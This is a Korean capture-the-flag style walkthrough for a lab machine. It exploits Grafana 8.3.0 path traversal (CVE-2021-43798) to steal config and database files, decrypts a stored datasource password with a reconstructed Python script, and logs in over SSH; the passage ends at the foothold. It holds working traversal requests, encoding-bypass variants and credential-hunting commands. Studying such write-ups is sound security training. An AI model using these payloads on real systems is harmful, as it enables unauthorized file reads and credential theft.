---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/exec/ssh-key
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.181
ports: [22, 3000, 9090]
services: [http, ssh]
cves: [CVE-2021-43798]
status: solved
manual_tags: true
tech_count: 3
---
PG Practice — Pentester Foundations #8
타겟 192.168.248.181 · OS Ubuntu 20.04 (`fanatastic`) · 난이도 Fundamental · **플래그 2개**
경로 요약 3000 Grafana 8.3.0 → **CVE-2021-43798** 비인증 트래버설로 `grafana.ini`·`grafana.db` 탈취 → 데이터소스 비밀번호 복호화 → `sysadmin` SSH → **`disk` 그룹** + `debugfs` → `/root/.ssh/id_rsa` → root

## 0. 이 박스에서 배우는 것

- **경로 트래버설이 "정적 파일 서빙 핸들러"에서 나는 이유** — 애플리케이션 로직이 아니라 파일 경로 조립 한 줄이 원인이다
- **`--path-as-is`** — 클라이언트가 페이로드를 먼저 망가뜨리는 경우. 이 CVE에서 "취약하지 않다"는 오판의 최대 원인
- **설정 파일의 주석이 곧 기본값 문서** — `;secret_key = ...` 가 비활성인데도 그 값이 실제로 쓰인다
- **해시 vs 가역 암호화의 전략적 구분** — 크랙해야 하는 것과 키만 있으면 100% 복원되는 것. 가역 쪽을 먼저 노려라
- **애플리케이션 자체 암호화 포맷 복원** — `salt || IV || ciphertext` + PBKDF2 + AES-CFB. 제품 소스를 읽고 포맷을 재현하는 훈련
- **`disk` 그룹 = root** — 파일 권한(`/root` 0700)이 왜 무력화되는지, `debugfs`가 무엇을 하는 도구인지

시험 출제 가능성. **높다.** 다만 "CVE-2021-43798 그 자체"가 아니라 구성 요소별로 나온다.
- **경로 트래버설로 설정 파일·DB 파일 읽기** — 시험 단골이다. 어떤 제품이든 "정적 파일 핸들러 + 사용자 제어 경로"면 같은 모양이다.
- **훔친 DB에서 가역 암호화된 자격증명 복호화** — 제품별 포맷만 다르고 흐름은 동일하다.
- **`id` 출력의 보조 그룹이 곧 권한상승**(`disk`·`docker`·`lxd`·`adm`·`shadow`) — 매우 흔하다.

이 박스에서 쓴 도구는 `curl`·`sqlite3`·`python3`·`ssh`·`debugfs`뿐으로 **전부 시험 허용**이다. 그대로 시험 자산이 된다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.181
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry
|_/
9090/tcp open  http    Golang net/http server
|_http-title: Prometheus Time Series Collection and Processing Server
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

명령 플래그 해설.

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 기본 1000포트만 본다. 3000·9090이 기본 목록 밖은 아니지만, 고번호 포트에 웹이 있는 박스에서는 이 한 줄이 생사를 가른다([[Hawat]]에서 실제로 그랬다) |
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `http-title`·`http-robots.txt` 같은 무료 힌트를 놓친다 |
| `-Pn` | ping 생략, 살아있다고 가정 | ICMP 차단 호스트를 "다운"으로 오판한다. **랩·시험에서는 항상 켠다** |
| `--min-rate 5000` | 초당 최소 패킷 수 | 전수 스캔이 수십 분으로 늘어난다. 24시간 시험에서 치명적 |
| `-oN` | 사람이 읽는 포맷 저장 | 나중에 `grep`할 원본이 사라진다. **스캔 결과는 무조건 파일로 남긴다** |

nmap의 OS 지문보다 SSH 배너가 정확하다. `MikroTik RouterOS`는 오탐이다. **`OpenSSH 8.2p1 Ubuntu 4ubuntu0.4`** 가 Ubuntu 20.04 Focal을 확정한다.
패키지 리비전 문자열(`Ubuntu 4ubuntu0.4`)은 배포판·버전을 특정하는 가장 값싼 근거다.

### 9090 Prometheus — 열려는 있지만 길이 아니다

**9090 Prometheus 2.32.1도 완전 비인증**이다. 이 박스의 정석 경로에는 쓰이지 않지만, 실전이라면 그 자체가 보고 대상이다.

![[PG-Fanatastic-prometheus-targets.png]]

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s http://192.168.248.181:9090/api/v1/status/buildinfo
{"status":"success","data":{"version":"2.32.1","revision":"41f1a8125e664985dd30674e5bdf6b683eff5d32",...}}

┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s http://192.168.248.181:9090/debug/pprof/cmdline
/usr/local/bin/prometheus --config.file /etc/prometheus/prometheus.yml --storage.tsdb.path /var/lib/prometheus/ ...
```

`/debug/pprof/cmdline`이 실행 경로와 설정 파일 위치를 그대로 준다. 다만 `web.enable-admin-api`와 `web.enable-lifecycle`이 둘 다 `false`라 **관리 API를 통한 공격 경로는 막혀 있다.** 스크랩 타겟도 자기 자신뿐이라 내부망 정보도 없다.

Go 서비스를 만나면 `/debug/pprof/`. Go 표준 라이브러리의 pprof 핸들러는 임포트만 해도 라우트가 등록된다. 인증이 붙는 경우가 드물다.
- `/debug/pprof/cmdline` — **실행 인자와 설정 파일 경로** (= 트래버설로 무엇을 읽을지 결정하는 지도)
- `/debug/pprof/heap`·`goroutine` — 메모리 덤프. 운이 좋으면 그 안에 토큰·비밀번호가 들어 있다

**"막힌 서비스"라도 경로 정보를 주면 다음 단계의 입력값이 된다.** 여기서도 이 습관이 `/etc/prometheus/prometheus.yml` 같은 후보 경로를 공짜로 줬다.

### 버전 확인 — 두 갈래로 교차

**① 로그인 화면 푸터** — 브라우저로 열면 버전이 그대로 박혀 있다:

![[PG-Fanatastic-grafana-login.png]]

푸터의 `v8.3.0 (914fcedb72)`가 그것이다.

**② `/api/health`** — 비인증으로 버전과 DB 상태를 반환한다:

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s http://192.168.248.181:3000/api/health
{
  "commit": "914fcedb72",
  "database": "ok",
  "version": "8.3.0"
}
```

커밋 해시까지 일치. **Grafana 8.3.0 확정** → CVE-2021-43798 취약(8.3.1에서 패치).

Grafana를 만나면 `/api/health` 부터. 인증 없이 정확한 버전과 커밋 해시를 준다. [[Crane]]의 SuiteCRM `get_server_info`와 같은 성격의 엔드포인트다.
제품별로 이런 "비인증 버전 엔드포인트"를 알아두면 열거 시간이 크게 줄어든다.

| 제품 | 비인증 버전 엔드포인트 |
|---|---|
| Grafana | `/api/health` |
| Prometheus | `/api/v1/status/buildinfo` |
| Nextcloud / ownCloud | `/status.php` |
| Elasticsearch | `/` (루트 JSON) |
| Jenkins | `X-Jenkins` 응답 헤더 |
| GitLab | `/help` 푸터, `/api/v4/version`(인증 필요) |

**버전 판정은 독립 근거 2개** 원칙([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]])을 여기서도 지켰다 — 푸터와 API가 커밋 해시까지 일치했다.

### `/metrics`가 익스플로잇 입력값을 준다

Grafana의 `/metrics`(Prometheus 포맷)가 **인증 없이 41KB를 전부 뱉는다.** 여기 익스플로잇에 필요한 값이 들어 있다:

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s http://192.168.248.181:3000/metrics | grep -E 'build_info|stat_total_users'
grafana_build_info{branch="HEAD",edition="oss",goversion="go1.17.2",revision="914fcedb72",version="8.3.0"} 1
grafana_plugin_build_info{plugin_id="input",plugin_type="datasource",signature_status="valid",version="1.0.0"} 1
grafana_stat_total_users 1
```

`/metrics` 한 줄 한 줄이 다음 수를 정해준다.

| 메트릭 | 알려주는 것 | 다음 수 |
|---|---|---|
| `grafana_build_info{version="8.3.0"}` | 세 번째 독립 버전 근거 | CVE 매칭 확정 |
| `grafana_plugin_build_info{plugin_id="input"}` | 설치된 플러그인 ID | 트래버설 경로에 넣을 **확실히 유효한** 값 |
| `grafana_stat_total_users 1` | 계정이 하나뿐(=admin) | **브루트포스 무의미** → 트래버설이 유일한 길 |

`grafana_stat_total_users 1` 은 특히 값지다. 계정이 하나면 사용자명 열거도, 패스워드 스프레이도 기대값이 0에 가깝다. **"안 해도 되는 일"을 확정해주는 정보가 시험에서는 가장 비싸다.**

인증이 필요한 API는 전부 막혀 있다 — 트래버설 말고는 길이 없다는 뜻이다:

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.248.181:3000/api/datasources
401
```

`/api/frontend/settings`·`/api/org`·`/api/user`·`/api/search`·`/api/admin/settings` 전부 `401 {"message":"Unauthorized"}`.

`-o /dev/null -w '%{http_code}\n'` 조합. 본문을 버리고 상태 코드만 뽑는다. 엔드포인트 수십 개를 훑을 때 화면이 깨끗해지고, `for` 루프에 그대로 넣을 수 있다.
```bash
for p in /api/datasources /api/org /api/user /api/search /api/admin/settings; do
  printf '%s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.248.181:3000$p"
done
```
401/403(존재하지만 인증 필요)과 404(없음)의 **차이 자체가 정보**다. 401이 줄줄이 나온다는 건 "제품은 정상이고 내가 인증이 없을 뿐"이라는 뜻이다.

---

## 2. 취약점 분석

### 2-1. 배경 지식 — 경로 트래버설은 "파일 경로 조립"의 문제다

경로 트래버설(Path Traversal, CWE-22)은 사용자 입력이 파일시스템 경로의 일부가 되고, 그 경로가 의도한 디렉터리 밖으로 나가는 것을 막지 못할 때 성립한다. 웹 애플리케이션에서 이게 가장 자주 나오는 자리는 로직이 화려한 곳이 아니라 **정적 파일을 서빙하는 핸들러**다. 이유는 단순하다 — 그 핸들러의 본질이 "URL의 나머지 부분을 파일 경로로 쓰는 것"이기 때문이다.

```
사용자 제어 문자열  ─┐
                    ├─→  경로 조립  ─→  파일 열기  ─→  내용 반환
고정된 기준 디렉터리 ─┘
```

이 파이프라인에서 방어가 들어갈 지점은 세 곳뿐이다:

| 방어 지점 | 방법 | 왜 자주 실패하는가 |
|---|---|---|
| 조립 **전** | 입력에서 `..`·`/`·널바이트 제거, 화이트리스트 | 인코딩 변형(`%2e%2e`, `..%2f`, `....//`)에 뚫린다. 블랙리스트는 항상 진다 |
| 조립 후 | 정규화한 절대경로가 **기준 디렉터리로 시작하는지** 검사 | 이 검사를 아예 안 하는 것이 이 CVE다 |
| OS 레벨 | chroot, 컨테이너, 최소 권한 계정 | 애플리케이션 개발자의 손을 떠나 있어 실제로는 없는 경우가 많다 |

**정답은 "조립 후 검사"다.** 정규화된 결과가 기준 디렉터리 하위인지 확인하는 것 — 이것만이 인코딩 변형 전부를 한 번에 막는다.

### 2-2. 왜 Grafana 8.3.0이 취약한가

Grafana는 플러그인의 정적 자산(JS·CSS·이미지)을 다음 라우트로 서빙한다:

```
GET /public/plugins/<plugin_id>/<파일경로>
```

`<파일경로>` 부분은 **와일드카드로 통째로 캡처**된다. 핸들러가 하는 일은 개념적으로 이렇다:

```go
// 개념 재구성 — 취약한 형태
requestedFile := c.Params("*")                          // URL에서 그대로 가져온 문자열
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
f, err := os.Open(pluginFilePath)                       // 검사 없이 연다
```

> [!danger] `filepath.Join`은 **보안 경계가 아니다**
> Go의 `filepath.Join`은 내부적으로 `filepath.Clean`을 호출한다. 즉 `..`를 **없애는 게 아니라 해석해서 적용한다.**
> ```
> filepath.Join("/var/lib/grafana/plugins/alertlist",
>               "../../../../../../../../etc/passwd")
>   →  "/etc/passwd"
> ```
> 결과는 문법적으로 완벽하게 정상인 절대경로다. `os.Open`이 거부할 이유가 없다.
>
> **`Clean`/`Join`은 경로를 예쁘게 만들 뿐, "밖으로 나갔는지"는 알려주지 않는다.** 그것을 아는 유일한 방법은 조립 결과를 기준 디렉터리와 직접 비교하는 것이다:
> ```go
> if !strings.HasPrefix(filepath.Clean(pluginFilePath), plugin.PluginDir+string(os.PathSeparator)) {
>     return 403
> }
> ```
> 8.3.1의 수정이 정확히 이 성격이다 — 상대경로 정화 + 기준 디렉터리 이탈 검사 추가.
>
> [가정] 함수·변수의 정확한 이름과 파일 위치는 8.3.0 소스를 직접 대조하지 않았다. **메커니즘(정규화는 되지만 경계 검사가 없다)은 확정**이고, 식별자 표기는 개념 재구성이다.

여기에 조건 하나가 더 붙는다 — **웹 프레임워크가 요청 경로를 미리 정규화하지 않아야** 한다.

| 계층 | 정규화 여부 | 결과 |
|---|---|---|
| 브라우저/`curl` (기본) | **한다** (RFC 3986 `remove_dot_segments`) | 서버에 `..`가 도달조차 안 함 |
| Go `net/http.ServeMux` | 한다 (301로 정규화된 경로로 리다이렉트) | 트래버설 차단됨 |
| Grafana의 라우터 (macaron 계열) 와일드카드 | **안 한다** | `..`가 핸들러까지 원문 그대로 전달 |

즉 이 CVE는 **"라우터가 원문을 넘긴다 + 핸들러가 경계를 검사하지 않는다"** 두 조건의 곱이다. 어느 한쪽만 있으면 성립하지 않는다.

이 유형을 일반화하면, 어떤 제품에서든 아래 신호가 보이면 트래버설을 먼저 의심한다:
- URL에 **자산 경로가 그대로 노출**된다 (`/static/...`, `/public/...`, `/assets/...`, `/theme/...`, `/download?file=...`)
- 경로 안에 **플러그인·테마·모듈 ID 같은 식별자 세그먼트**가 있다 (그 뒤가 파일 경로일 가능성이 높다)
- 응답이 `Content-Type`을 확장자로 추론한다 (파일을 직접 열고 있다는 증거)

### 2-3. 왜 이 페이로드인가 — 조각 분해

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
...
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```

페이로드 조각 해설.

| 조각 | 역할 | 빼거나 틀리면 |
|---|---|---|
| `/public/plugins/` | 취약한 라우트의 고정 접두 | 다른 라우트는 와일드카드 캡처가 아니다 → 404 |
| `alertlist` | **실재하는 플러그인 ID** | 존재하지 않는 ID면 플러그인 조회 단계에서 404. 파일 경로 조립까지 가지도 못한다 |
| `/../` × 8 | 기준 디렉터리에서 위로 탈출 | 부족하면 여전히 플러그인 디렉터리 안 → 404. **넘치면 무해** (`/..`는 `/`이므로) |
| `etc/passwd` | 목표 절대경로 (선행 `/` 없이 이어붙음) | — |
| `--path-as-is` | curl의 클라이언트 측 정규화 억제 | **서버에 트래버설이 도달하지 않는다** (2-4 참조) |

`../`는 넉넉하게 넣어라. 루트 디렉터리에서 `..`는 다시 루트다(`/.. == /`). 그래서 **필요한 개수보다 많이 넣어도 부작용이 없다.**
깊이를 계산하느라 시간을 쓰지 말고 **8~12개를 기본값으로** 던진다. 부족해서 404를 받고 "안 되는구나" 결론내는 것이 훨씬 비싼 실수다.

플러그인 ID에 관해 두 사실이 함께 성립한다 — 헷갈리기 쉬우니 정리한다:

- **번들 코어 플러그인**(`alertlist`·`graph`·`table` 등)은 어느 설치본에나 있으므로 대개 그냥 통한다. 이 박스에서도 `alertlist`로 성공했다.
- 그럼에도 `/metrics`의 `plugin_id="input"`이 가치 있는 이유는, 버전에 따라 번들 목록이 바뀌고 추측이 빗나가면 404가 "취약하지 않음"으로 오독되기 때문이다. `/metrics`는 **추측을 실측으로 바꿔준다.**

### 2-4. `--path-as-is` — 이 CVE 최대의 오판 원인

> [!danger] `--path-as-is`가 없으면 실패한다
> curl은 기본적으로 URL의 `../`를 **클라이언트 측에서 정규화**해버린다. 그러면 서버에는 트래버설이 아예 도달하지 않는다.
> `--path-as-is`를 빼먹고 "취약하지 않다"고 결론내는 것이 이 CVE의 가장 흔한 실수다.

무슨 일이 벌어지는지 정확히 보자. curl은 RFC 3986 §5.2.4의 `remove_dot_segments` 알고리즘을 URL에 적용한 뒤 요청을 보낸다:

```
내가 친 것:   /public/plugins/alertlist/../../../../../../../../etc/passwd
curl이 보낸 것: /etc/passwd            ← 서버 입장에서는 그냥 존재하지 않는 경로
서버 응답:      404
```

**서버는 트래버설을 본 적도 없다.** 그런데 화면에는 404가 찍히니, 사람은 "패치됐나 보다"라고 읽는다. 이 오해는 페이로드가 틀린 것도 아니고 타겟이 안전한 것도 아닌 순수한 도구 문제라 특히 알아채기 어렵다.

도구별 동작이 전부 다르다 — 외워두면 시간을 번다.

| 도구 | 기본 동작 | 원문 그대로 보내려면 |
|---|---|---|
| `curl` | **정규화함** | `--path-as-is` |
| `wget` | **정규화함** | 확실한 억제 옵션이 없다. `curl`로 갈아타라 |
| 브라우저 주소창 | **정규화함** | 개발자도구 fetch로도 정규화된다. 프록시를 써라 |
| Burp Repeater | **안 함** (원문 전송) | 그대로 |
| `python3 requests` | 기본은 정규화하지 않으나 리다이렉트·세션에서 재구성될 수 있다 | 확인 후 사용 |
| 생 소켓 (`nc`/`openssl s_client`) | **안 함** | 가장 확실한 최후 수단 |

트래버설이 404를 뱉으면 제일 먼저 의심할 것은 서버가 아니라 내 클라이언트다.

생 소켓으로 확인하는 법 — 도구를 신뢰할 수 없을 때의 최종 심판:

```bash
printf 'GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1\r\nHost: 192.168.248.181:3000\r\nConnection: close\r\n\r\n' | nc 192.168.248.181 3000
```

정규화 계층이 하나도 없으므로 **내가 친 바이트가 그대로** 서버에 도착한다.

우회 변형 사다리. 서버 앞단(리버스 프록시·WAF)이 `..`를 걸러낼 때 순서대로 시도한다:
```
../                (기본)
..%2f              (슬래시만 인코딩)
%2e%2e%2f          (점까지 인코딩)
..%252f            (이중 인코딩 — 프록시가 한 번 디코딩할 때)
....//             (필터가 ".." 를 한 번만 제거할 때 복원됨)
..%c0%af           (구형 서버의 오버롱 UTF-8)
```
**이 박스는 첫 줄로 끝난다.** 앞단이 없기 때문이다. 나머지는 "그래도 안 될 때"의 사다리로 기억해 둔다.

### 2-5. 무엇을 읽을 것인가 — 읽기 원시성의 우선순위

트래버설이 성립하면 **임의 파일 읽기(arbitrary file read)** 원시성을 얻은 것이다. 이때 무엇을 읽느냐가 소요 시간을 결정한다. 순서는 다음과 같다.

| 순위 | 대상 | 이유 |
|---|---|---|
| 1 | `/etc/passwd` | **트래버설 성립 증명 + 계정 목록.** 항상 첫 타자 |
| 2 | **그 제품의 설정 파일** | 비밀키·DB 경로·자격증명이 한곳에 모여 있다 |
| 3 | **그 제품의 DB 파일** | SQLite면 통째로 가져와 로컬에서 마음껏 질의 |
| 4 | 서비스 계정 `~/.ssh/id_rsa` | 있으면 즉시 셸 |
| 5 | `/proc/self/environ`, `/proc/self/cmdline` | 환경변수에 시크릿이 흔하다 |
| 6 | `/etc/shadow` | 대개 권한 부족으로 실패(=프로세스가 root가 아니라는 증거) |

`/etc/passwd`의 세 줄이 이미 많은 것을 말한다:

```
grafana:x:113:117::/usr/share/grafana:/bin/false      ← 서비스 계정, 셸 없음
prometheus:x:1000:1000::/home/prometheus:/bin/false   ← 서비스 계정, 셸 없음
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh          ← 셸이 있는 유일한 일반 사용자
```

`/etc/passwd`는 "누구로 로그인할 것인가"의 후보 명단이다. **셸이 `/bin/false`·`/usr/sbin/nologin`이 아닌 계정**만 SSH 대상이 된다. 여기서는 `sysadmin` 하나뿐이다.
UID 1000번대는 사람이 만든 계정, 100 미만은 시스템 계정이라는 관례도 함께 읽는다.
이 시점에 이미 **"목표는 sysadmin의 비밀번호"** 로 좁혀진다.

목표 파일 두 개를 뽑는다. **바이너리는 반드시 `-o`로 저장하고 `file`로 검증**한다:

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini' -o grafana.ini
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ file grafana.db
grafana.db: SQLite 3.x database, ... database pages 187, ... UTF-8
```

> [!warning] 바이너리를 터미널로 흘리지 마라
> `-o` 없이 받으면 SQLite 헤더의 널바이트가 터미널을 망가뜨리고, 파이프로 넘기면 인코딩 변환에 조용히 손상된다.
> **`-o 파일` → `file` → (가능하면) `md5sum`** 이 순서가 습관이 되어야 한다. DB가 깨지면 이후 단계가 통째로 무너지는데, 그 사실을 몇 단계 뒤에나 알게 된다.
>
> 경로는 데비안/우분투 패키지 설치의 표준 위치다: 설정 `/etc/grafana/grafana.ini`, 데이터 `/var/lib/grafana/grafana.db`, 로그 `/var/log/grafana/`. **제품마다 이 3종 세트를 외워두면 트래버설이 즉시 무기가 된다.**

### 2-6. secret_key — 이 박스 최대의 함정

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ grep -n 'secret_key' grafana.ini
223:;secret_key = SW2YcwTIb9zpOOhoPsMm
225:# current key provider used for envelope encryption, default to static value specified by secret_key
907:;secret_key =
```

> [!danger] 설정 파일의 값이 **주석 처리돼 있다**
> `;`로 시작하니 이 줄은 비활성이다. "설정에 없으니 다른 데서 찾아야 하나" 하고 헤매기 쉽다.
> 실제로는 그 반대다 — 주석 처리 = 기본값이 적용된다는 뜻이고, Grafana의 컴파일 기본값이 정확히 `SW2YcwTIb9zpOOhoPsMm`다. 즉 **주석 안에 적힌 그 값이 실제로 쓰이고 있다.**
> 복호화가 성공하면서 사후 확증됐다.
>
> 일반화하면: **설정 파일에서 주석 처리된 항목은 "그 값이 기본값"이라는 문서다.** 지우지 말고 읽어라.

왜 이런 구조가 되는지 알아두면 다음 제품에서도 같은 판단이 선다. 배포용 설정 파일은 대개 **"주석 처리된 전체 옵션 목록 + 기본값"** 형태로 배포된다. 목적은 사용자에게 "무엇을 바꿀 수 있고 안 바꾸면 뭐가 되는지"를 보여주는 것이다. 따라서:

| 파일 상태 | 실제 적용값 | 공격자에게 주는 정보 |
|---|---|---|
| `;secret_key = SW2Ycw...` (주석) | **컴파일 기본값** = 그 값 | 키를 그대로 얻음 |
| `secret_key = Abc123...` (활성) | 그 값 | 키를 그대로 얻음 |
| 줄 자체가 없음 | 컴파일 기본값 | 제품 소스/문서에서 기본값을 찾아야 함 |

세 경우 모두 **키를 얻는다.** 주석이라고 버리는 순간만 못 얻는다.

907행의 `;secret_key = ` (빈 값)는 다른 섹션(엔벨로프 암호화 키 프로바이더 관련)의 항목이며, 실제로 사용된 것은 223행의 값이다 — 복호화 성공이 그것을 증명한다.

시험 반사 — 설정 파일을 손에 넣으면:
```bash
grep -nEi 'pass|secret|key|token|admin|user|url|host|db|smtp' grafana.ini | grep -v '^\s*$'
```
**`;`/`#`로 시작하는 줄을 필터링해서 버리지 마라.** 여기서는 그 줄이 정답이었다.

### 2-7. DB 덤프 — 해시가 아니라 가역 암호화를 노려라

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ sqlite3 grafana.db 'select id,name,type,url,basic_auth_user,secure_json_data from data_source;'
1|Prometheus|prometheus|http://localhost:9090|sysadmin|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}

┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ sqlite3 grafana.db 'select id,login,password,salt,is_admin from user;'
1|admin|63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8|0Vq2cDMrPt|1
```

**`basic_auth_user`가 `sysadmin`** — `/etc/passwd`에서 본 OS 계정명과 같다. 이 일치가 "복호화하면 SSH로 재사용된다"는 확신을 준다.

`user` 테이블의 admin 해시(sha256+salt)는 크랙할 필요가 없다. 데이터소스 비밀번호는 **가역 암호화**라 복호화가 되고, 그것만으로 경로가 완결된다.

> [!danger] 해시 vs 암호화 — 이 구분이 시간 배분을 결정한다
> | | `user.password` | `data_source.secure_json_data` |
> |---|---|---|
> | 방식 | 해시(PBKDF2-SHA256 + salt, 단방향) | **대칭키 암호화**(AES-256-CFB, 양방향) |
> | 복원 | 사전 대입 = 확률 게임 | 키만 있으면 **100% 결정적** |
> | 필요한 것 | 워드리스트 + 시간 + 운 | `secret_key` 하나 |
> | 실패 가능성 | 높다 (강한 비밀번호면 영영 못 깬다) | **0** |
> | 시험에서 | 시간을 태우는 함정이 되기 쉽다 | 먼저 노려야 할 표적 |
>
> **가역 쪽을 먼저 노려라.** DB를 덤프했으면 테이블을 훑으며 "이건 해시인가 암호문인가"를 먼저 분류한다.
>
> 구분법: **길이가 들쭉날쭉하고 base64이며 앞부분에 랜덤 바이트가 붙어 있으면 암호문**이다(salt/IV가 포함되므로). 고정 길이 hex(32/40/64자)면 해시다. 여기서는 admin 쪽이 고정 hex, 데이터소스 쪽이 base64 — 한눈에 갈린다.
>
> 시험에서 admin 해시를 크랙하겠다고 앉으면 **몇 시간이 사라진다.** 반면 `secret_key`는 이미 손에 있었다.

### 2-8. Grafana 암호화 포맷 — 왜 이 구조인가

Grafana 구버전 포맷: `salt(8바이트) || IV(16바이트) || ciphertext`, 키 = `PBKDF2-HMAC-SHA256(secret_key, salt, 10000, 32)`

base64를 디코딩하면 바이트 배치가 이렇게 나뉜다:

```
 0        8                24                        끝
 ├────────┼─────────────────┼──────────────────────────┤
   salt        IV(16)              ciphertext
   (8B)     = AES 블록크기        평문과 같은 길이(CFB는 스트림 모드)
```

각 요소가 왜 필요한지가 이 절의 핵심이다.

| 요소 | 역할 | 없으면 |
|---|---|---|
| **salt (8B)** | `secret_key`에서 실제 AES 키를 유도할 때의 입력. 레코드마다 다름 | 같은 마스터 키로 모든 레코드가 같은 AES 키를 쓰게 된다. 하나 깨지면 전부 깨짐 |
| **PBKDF2 10000회** | 짧은 사람용 문자열(`SW2Ycw...`, 20자)을 32바이트 균일 키로 늘리고, 무차별 대입 비용을 올림 | `secret_key`를 그대로 AES 키로 쓰면 길이도 안 맞고 엔트로피 분포도 나쁘다 |
| **IV (16B)** | CFB 모드의 초기 블록. 레코드마다 다름 | 같은 평문 → 같은 암호문. 비밀번호가 같은 두 데이터소스가 눈으로 식별된다 |
| **AES-256-CFB** | 블록 암호를 스트림처럼 쓰는 모드 | ECB/CBC였다면 패딩이 필요하고 평문 길이가 노출된다. CFB는 패딩 없이 임의 길이 처리 |

왜 salt와 IV가 암호문 앞에 평문으로 붙어 있는가. 둘 다 **비밀이 아니기 때문**이다. salt와 IV는 "같은 키로 같은 평문을 암호화해도 결과가 달라지게" 만드는 장치일 뿐, 알려져도 안전성이 떨어지지 않는다.
오히려 복호화하려면 반드시 필요하므로 **암호문과 함께 저장하는 것이 정상 설계**다. 거의 모든 실제 포맷(`$5$`·`$2y$` 해시 문자열, Fernet, JWE)이 같은 방식이다.

역으로 공격자에게 의미하는 것: 암호문만 있으면 salt·IV는 공짜로 얻는다. **부족한 것은 오직 마스터 키 하나**다. 그래서 이 박스의 승부는 `grafana.ini`를 읽는 순간 이미 끝나 있었다.

복호화:

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ python3 decrypt.py 'SW2YcwTIb9zpOOhoPsMm' 'anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=='
salt= b'jpgyaMCl'
iv  = fe2031a1cf76bbc316aa8e29ae825497
PLAINTEXT: b'SuperSecureP@ssw0rd'
```

**`sysadmin` / `SuperSecureP@ssw0rd`**

> [!tip] `decrypt.py` 재구성 — 포맷만 알면 20줄이다 [가정]
> 아래는 위 출력과 동일한 결과를 내도록 **포맷 정의로부터 재구성한 참고 구현**이다(원본 스크립트 전문이 노트에 남아 있지 않아 재작성했다). 시험장에서 같은 상황을 만나면 이 골격을 기억하면 된다.
> ```python
> import sys, base64, hashlib
> from Crypto.Cipher import AES          # pip install pycryptodome
>
> secret_key = sys.argv[1].encode()
> blob = base64.b64decode(sys.argv[2])
>
> salt, iv, ct = blob[:8], blob[8:24], blob[24:]
> key = hashlib.pbkdf2_hmac('sha256', secret_key, salt, 10000, 32)
> pt = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128).decrypt(ct)
>
> print('salt=', salt)
> print('iv  =', iv.hex())
> print('PLAINTEXT:', pt)
> ```
> **`segment_size=128`이 함정이다.** pycryptodome의 CFB 기본 세그먼트는 8비트(CFB8)인데 Go의 `cipher.NewCFBDecrypter`는 전체 블록(128비트) CFB다. 이걸 빼면 첫 바이트만 맞고 나머지가 쓰레기로 나온다 — "키가 틀렸나" 하고 엉뚱한 곳을 뒤지게 되는 전형적인 함정이다.
>
> 검증법: 평문이 출력 가능한 ASCII로 끝까지 나오면 성공. 앞 한두 글자만 말이 되면 **모드 파라미터를 의심**하라.

---

## 3. Foothold — 자격증명 재사용

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ ssh sysadmin@192.168.248.181
sysadmin@fanatastic:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
sysadmin@fanatastic:~$ cat local.txt
de1e53adbb59aa276d386e13838cb680
```

`groups`에 **`6(disk)`** — 이게 곧 root다.

왜 SSH를 곧바로 시도했는가. 확신의 근거가 세 겹이었다:
1. `basic_auth_user = sysadmin` — DB의 사용자명
2. `/etc/passwd`의 `sysadmin:...:/bin/sh` — 같은 이름의 **셸 있는** OS 계정
3. 22/tcp 열림

